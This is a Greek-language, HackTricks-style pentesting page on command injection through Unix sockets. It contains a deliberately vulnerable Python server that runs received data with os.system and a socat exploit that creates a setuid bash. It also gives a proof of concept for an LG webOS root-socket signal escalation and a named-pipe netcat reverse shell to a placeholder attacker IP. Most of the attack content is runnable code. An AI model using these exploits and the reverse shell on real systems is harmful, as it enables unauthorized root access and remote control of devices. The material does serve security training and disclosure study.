# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Παράδειγμα binding socket με Python

Στο ακόλουθο παράδειγμα δημιουργείται ένα **unix socket** (`/tmp/socket_test.s`) και οτιδήποτε **λαμβάνεται** πρόκειται να **εκτελεστεί** από το `os.system`. Γνωρίζω ότι δεν πρόκειται να το βρείτε στην πράξη, αλλά ο στόχος αυτού του παραδείγματος είναι να δείξει πώς μοιάζει ο κώδικας που χρησιμοποιεί unix sockets και πώς να διαχειρίζεστε το input στη χειρότερη δυνατή περίπτωση.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Εκτελέστε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **ελέγξτε πώς ακούει το socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Μελέτη περίπτωσης: κλιμάκωση μέσω σήματος σε root-owned UNIX socket (LG webOS)

Ορισμένα privileged daemons εκθέτουν ένα root-owned UNIX socket που δέχεται untrusted input και συνδέει privileged actions με thread IDs και signals. Αν το πρωτόκολλο επιτρέπει σε έναν unprivileged client να επηρεάσει ποιο native thread θα στοχευτεί, ενδέχεται να μπορέσετε να ενεργοποιήσετε ένα privileged code path και να κάνετε escalation.<sup>[[1]](#references)[[2]](#references)</sup>

Το κύριο write-up και η disclosure περιγράφουν την ακόλουθη ακολουθία.<sup>[[1]](#references)[[2]](#references)</sup>

Παρατηρημένο μοτίβο:
- Συνδεθείτε σε ένα root-owned socket (π.χ. /tmp/remotelogger).
- Δημιουργήστε ένα thread και λάβετε το native thread id (TID) του.
- Στείλτε το TID (packed) μαζί με padding ως request· λάβετε ένα acknowledgement.
- Στείλτε ένα συγκεκριμένο signal σε αυτό το TID για να ενεργοποιήσετε την privileged συμπεριφορά.

Το συνοπτικό PoC παρακάτω αντικατοπτρίζει αυτή την ακολουθία.<sup>[[1]](#references)[[2]](#references)</sup>
Ελάχιστο PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Για να μετατραπεί αυτό σε root shell, μπορεί να χρησιμοποιηθεί ένα απλό μοτίβο named-pipe + nc.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Σημειώσεις:
- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από κατάσταση client χωρίς προνόμια (TIDs) και τη σύνδεσή τους με privileged signal handlers ή logic.<sup>[[1]](#references)</sup>
- Ενισχύστε την ασφάλεια επιβάλλοντας credentials στο socket, επικυρώνοντας τις μορφές των μηνυμάτων και αποσυνδέοντας τις privileged λειτουργίες από externally supplied thread identifiers.

## References

- [1] [Jailbreak webOS για διασκέδαση (μόνο για διασκέδαση)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS TV Path Traversal, Authentication Bypass και Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
